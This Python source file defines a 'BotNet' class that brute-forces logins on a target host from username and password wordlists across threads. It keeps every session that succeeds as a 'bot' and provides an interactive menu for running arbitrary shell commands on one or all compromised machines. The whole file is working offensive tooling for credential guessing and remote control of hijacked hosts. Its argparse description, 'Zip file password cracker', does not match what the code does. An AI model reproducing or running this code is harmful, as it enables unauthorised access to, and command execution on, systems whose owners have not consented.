import argparse
from threading import Thread
from typing import Optional
from termcolor import colored
from src.entities.Bot import Bot
from src.constants.logo import ascii_logo
from src.utils.read_txt_files import read_text_file


class BotNet:
    def __init__(self, host: str = '', usr_src_path: str = '', pwd_src_path: str = ''):
        self.__bots: list[Bot] = []

        self.host = host
        self.usr_src_path = usr_src_path
        self.pwd_src_path = pwd_src_path

        if not self.host or not self.usr_src_path or not self.pwd_src_path:
            self.__get_args()

        print(colored(ascii_logo, 'cyan'))


    def __get_args(self):
        parser = argparse.ArgumentParser(description='Zip file password cracker')
        parser.add_argument('-H', dest='host', type=str, help='Target host', required=True)
        parser.add_argument('-u', dest='usr_src_path', type=str, help='Users source path', required=True)
        parser.add_argument('-p', dest='pwd_src_path', type=str, help='Passwords source path', required=True)
        args = parser.parse_args()

        self.host = args.host
        self.usr_src_path = args.usr_src_path
        self.pwd_src_path = args.pwd_src_path


    def __get_passwords(self):
        for password in read_text_file(self.pwd_src_path):
            yield password


    def __get_users(self):
        for password in read_text_file(self.usr_src_path):
            yield password


    def __set_bots(self, user: str):

        for password in self.__get_passwords():
            bot = Bot(self.host, user, password)

            try:
                is_connected = bot.connect()
                if is_connected:
                    print(colored(f'Connected to [{bot.id}][{bot.name}]', 'green'))
                    self.__bots.append(bot)
            except:
                pass


    def disconnect_all(self):
        print(colored('\nDisconnecting all bots...', 'yellow'))
        for bot in self.__bots:
            try:
                bot.disconnect()
            except:
                pass


    def __select_bot(self) -> Optional[Bot]:
        while True:
            print(colored('Select a bot:', 'yellow'))
            print(colored('r: Return to menu', 'yellow'))
            print('\n')
            for bot in self.__bots:
                print(f'[{bot.id}][{bot.name}]')
            selection = input('> ')
            if selection == 'r':
                return None
            for bot in self.__bots:
                if bot.id == selection:
                    return bot
            print(colored('Invalid selection. Please enter a number from the list above or "r" to return to the menu.', 'red'))


    def __execute_command(self):
        while True:
            print(colored('Choose an option:', 'yellow'))
            print(colored('1. Select a specific bot', 'yellow'))
            print(colored('2. Run command on all bots', 'yellow'))
            print(colored('3. List all bots', 'yellow'))
            print(colored('9. Exit', 'yellow'))
            print('\n')

            option = input('> ')
            if option == '1':
                bot = self.__select_bot()
                if bot is None:
                    continue
                command = input(f'Enter command to execute on [{bot.id}][{bot.name}]: ')
                result = bot.execute_command(command)
                print(result)

            elif option == '2':
                print(colored('r: Return to menu', 'yellow'))
                print('\n')
                command = input('Enter command to execute on all bots: ')

                if command == 'r':
                    return None

                results = []
                for bot in self.__bots:
                    print(f'Executing command on [{bot.id}][{bot.name}]...')
                    result = bot.execute_command(command)
                    results.append((bot, result))
                    print(result)
                print('Command executed on all bots:')
                for bot, result in results:
                    print(f'[{bot.id}][{bot.name}]: {result}')

            elif option == '3':
                for bot in self.__bots:
                    print(f'[{bot.id}][{bot.name}]')
                print('\n')
                input(colored('Press enter to return to the menu...', 'yellow'))

            elif option == '9':
                print(colored('Exiting...', 'yellow'))
                self.disconnect_all()
                exit(0)

            else:
                print(colored('Invalid option.', 'red'))


    def run(self):
        print(colored('Connecting to bots...', 'yellow'))
        try:
            threads = []
            for password in self.__get_users():
                thread = Thread(target=self.__set_bots, args=(password,))
                thread.start()
                threads.append(thread)
            [t.join() for t in threads]

            while True:
                self.__execute_command()
        except KeyboardInterrupt:
            self.disconnect_all()
